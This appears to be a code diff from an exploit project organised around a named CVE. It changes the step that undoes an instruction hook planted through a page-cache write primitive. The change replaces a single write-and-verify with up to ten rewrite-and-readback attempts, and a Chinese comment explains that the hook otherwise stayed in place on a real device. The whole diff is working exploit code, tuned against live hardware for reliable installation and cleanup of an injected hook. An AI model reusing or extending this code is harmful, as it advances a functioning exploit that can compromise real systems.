@@ -263,18 +263,32 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         };
         put_word(within - 4U, plan.guard_instruction);
         put_word(within, plan.displaced_instruction);
-        const auto wrote = request.access->write(0U, std::span<const std::byte>(block, request.width),
-                                                request.channel, *request.params);
-        if (!wrote.ok() || wrote.value != request.width) {
-            *refusal = kRestoreWriteRefused;
-            return false;
+        /*
+         * 写是**派发式**的（与 write_image 同一条原语）：报文发出即返回，内核处理完才落到页缓存。
+         * 收尾恢复原先只写一次就回读 ⇒ 必然读到旧块 ⇒ `step-restore-verify-failed` ⇒ **钩子撤不掉**
+         * （真机 2026-10-17 00:06 连续两次复现，站点一直停在我们的分支 `832d0114`）。
+         * 处理：与写模块相同的有界重试——每次重发该块，再回读比较；helper 路径每次回读本身就带一次 fork
+         * （≈20 ms），因此重试天然带节拍，不需要额外的 sleep。上限 10 次，失败仍 fail-closed。
+         */
+        constexpr std::size_t kRestoreAttempts = 10U;
+        std::size_t attempt = 0U;
+        bool same = false;
+        for (; attempt < kRestoreAttempts; ++attempt) {
+            const auto wrote = request.access->write(0U, std::span<const std::byte>(block, request.width),
+                                                     request.channel, *request.params);
+            if (!wrote.ok() || wrote.value != request.width) {
+                *refusal = kRestoreWriteRefused;
+                return false;
+            }
+            const auto after = request.access->read(0U, request.width, request.channel, *request.params);
+            same = after.ok() && after.value.size() == request.width &&
+                   std::memcmp(after.value.data(), block, request.width) == 0;
+            if (same) {
+                break;
+            }
         }
-        const auto after = request.access->read(0U, request.width, request.channel, *request.params);
-        const bool same = after.ok() && after.value.size() == request.width &&
-                          std::memcmp(after.value.data(), block, request.width) == 0;
-        GL_LOGI("restore writeback: wrote=%zu/%zu off=0x%llx readback_ok=%d readback_same=%d",
-                wrote.value, request.width, static_cast<unsigned long long>(block_at),
-                after.ok() ? 1 : 0, same ? 1 : 0);
+        GL_LOGI("restore writeback: off=0x%llx width=%zu attempts=%zu readback_same=%d",
+                static_cast<unsigned long long>(block_at), request.width, attempt, same ? 1 : 0);
         if (!same) {
             *refusal = kRestoreVerifyFailed;
             return false;
